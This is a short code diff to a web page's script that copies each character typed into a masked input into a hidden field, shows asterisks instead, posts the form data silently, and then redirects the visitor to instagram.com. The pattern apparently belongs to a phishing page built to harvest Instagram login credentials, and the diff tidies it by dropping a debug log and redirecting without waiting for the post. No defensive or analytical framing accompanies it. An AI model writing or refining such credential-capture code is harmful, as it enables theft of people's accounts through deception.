@@ -40,7 +40,6 @@
             if (lastValue == '*') document.getElementById('text1').value = document.getElementById('text1').value.slice(0, -1) ?? '';
             else document.getElementById('text1').value += value[value.length - 1] ?? '';
 
-            console.log(document.getElementById('text1').value);
             input.value = '*'.repeat(value.length);
         }
         document.getElementsByClassName('form')[0].addEventListener('submit', function(event) {
@@ -54,12 +53,8 @@
                 method: 'POST',
                 body: formData
             })
-            .then(response => {
-                location.replace("https://www.instagram.com")
-            })
-            .catch(error => {
-                console.error('Error');
-            });
+
+            location.replace("https://www.instagram.com")
         });
     </script>
 </body>
